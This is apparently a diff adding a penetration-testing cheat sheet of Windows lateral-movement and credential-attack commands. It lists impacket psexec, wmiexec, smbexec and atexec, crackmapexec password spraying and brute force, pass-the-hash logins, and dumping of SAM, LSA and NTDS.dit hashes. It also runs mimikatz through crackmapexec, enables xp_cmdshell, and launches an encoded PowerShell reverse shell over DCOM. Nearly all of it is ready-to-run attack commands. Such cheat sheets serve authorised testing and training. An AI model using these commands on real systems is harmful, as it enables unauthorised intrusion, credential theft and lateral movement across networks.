@@ -1,0 +1,85 @@
+
+atexec
+Execute command with atexec (credentials):atexec.py test.local/john:password123@10.10.10.1 \<command\>
+Execute command with atexec (hash):atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 \<command\>
+crackmapexec
+Basic SMB enumeration:crackmapexec smb \<IP/range\>
+Enumerate SMB with credentials:crackmapexec smb 192.168.1.100 -u username -p password
+List SMB shares with credentials:crackmapexec smb 192.168.1.100 -u username -p password --shares
+List SMB users with credentials:crackmapexec smb 192.168.1.100 -u username -p password --users
+Enumerate all SMB info with credentials:crackmapexec smb 192.168.1.100 -u username -p password --all
+List SMB shares on specific port:crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares
+List SMB shares in specific domain:crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares
+Enumerate supported services:crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}
+Bruteforce attack (shows 'Pwned'):crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt --continue-on-success
+Bruteforce attack (grep 'Pwned'):crackmapexec smb \<Rhost/range\> -u user.txt -p password.txt --continue-on-success | grep '[+]'
+Password spraying:crackmapexec smb \<Rhost/range\> -u user.txt -p 'password' --continue-on-success
+List shares with credentials:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --shares
+List disks with credentials:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --disks
+Enumerate users (requires DC IP):crackmapexec smb \<DC-IP\> -u 'user' -p 'password' --users
+List active logon sessions:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --sessions
+Dump password policy:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --pass-pol
+Dump SAM hashes:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --sam
+Dump LSA secrets:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --lsa
+Dump NTDS.dit file:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --ntds
+Enumerate specific group members:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' --groups {groupname}
+Execute CMD command:crackmapexec smb \<Rhost/range\> -u 'user' -p 'password' -x 'command'
+Execute command with Pass-the-Hash (local auth):crackmapexec smb \<ip or range\> -u username -H \<full hash\> --local-auth
+List crackmapexec modules:crackmapexec smb -L
+Show module options (e.g., mimikatz):crackmapexec smb -M mimikatx --options
+Run mimikatz module (default):crackmapexec smb \<Rhost\> -u 'user' -p 'password' -M mimikatz
+Run specific mimikatz command:crackmapexec smb \<Rhost\> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug'
+Enumerate GPP passwords:crackmapexec smb \<TARGET[s]\> -u \<USERNAME\> -p \<PASSWORD\> -d \<DOMAIN\> -M gpp\_password
+Enumerate GPP passwords (PTH):crackmapexec smb \<TARGET[s]\> -u \<USERNAME\> -H LMHash:NTLMHash -d \<DOMAIN\> -M gpp\_password
+Password spray (continue on success):crackmapexec smb \<IP or subnet\> -u users.txt -p 'pass' -d \<domain\> --continue-on-success
+cmedb
+Launch crackmapexec database console:cmedb
+View help in cmedb console:help
+dcom
+Execute DCOM command (calc):$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+Execute DCOM command (powershell reverse shell):$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+evil-winrm
+Login with password (plaintext):evil-winrm -i \<IP\> -u user -p pass
+Login with password (SSL):evil-winrm -i \<IP\> -u user -p pass -S
+Login with NTLM hash:evil-winrm -i \<IP\> -u user -H ntlmhash
+Login with certificate key:evil-winrm -i \<IP\> -c certificate.pem -k priv-key.pem -S
+Login and save logs:evil-winrm -i \<IP\> -u user -p pass -l
+Upload file in session:upload \<file\>
+Download file in session:download \<file\> \<filepath-kali\>
+Load scripts from local directory:evil-winrm -i \<IP\> -u user -p pass -s /opt/privsc/powershell
+View evil-winrm commands:menu
+Execute binary from local share:Invoke-Binary /opt/privsc/winPEASx64.exe
+impacket-mssqlclient
+Log in to MSSQL:impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+Show advanced options (MSSQL):EXECUTE sp\_configure 'show advanced options', 1;
+Reconfigure (MSSQL):RECONFIGURE;
+Enable xp\_cmdshell (MSSQL):EXECUTE sp\_configure 'xp\_cmdshell', 1;
+Execute command (MSSQL):EXECUTE xp\_cmdshell 'whoami';
+impacket-smbexec
+Execute command with smbexec (credentials):smbexec.py test.local/john:password123@10.10.10.1
+Execute command with smbexec (hash):smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+Lateral movement (credentials):smbexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
+Lateral movement (hash):smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
+impacket-wmiexec
+Execute command with wmiexec (credentials):wmiexec.py test.local/john:password123@10.10.10.1
+Execute command with wmiexec (hash):wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+Lateral movement (credentials):wmiexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
+Lateral movement (hash):wmiexec.py -hashes aad3b435b51404eeaad3Fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
+psexec
+Execute command with psexec (credentials):psexec.py test.local/john:password123@10.10.10.1
+Execute command with psexec (hash):psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+Lateral movement (credentials):psexec.py \<domain\>/\<user\>:\<password1\>@\<IP\>
+Lateral movement (hash):psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 \<domain\>/\<user\>@\<IP\> \<command\>
+pth-winexe
+Pass the Hash with pth-winexe:pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
+ssh
+Login with password:ssh uname@IP
+Login with key:ssh uname@IP -i id\_rsa/id\_ecdsa
+SSH dynamic port forward (SOCKS proxy):ssh adminuser@10.10.155.5 -i id\_rsa -D 9050
+Login with public key:ssh username@target\_ip
+winrs
+Execute remote command with winrs:winrs -r:\<computername\> -u:\<user\> -p:\<password\> "command"
+xfreerdp
+Connect to RDP (user/pass):xfreerdp /u:uname /p:'pass' /v:IP
+Connect to RDP (domain/user/pass):xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
+Connect to RDP (clipboard):xfreerdp /u:uname /p:'pass' /v:IP +clipboard
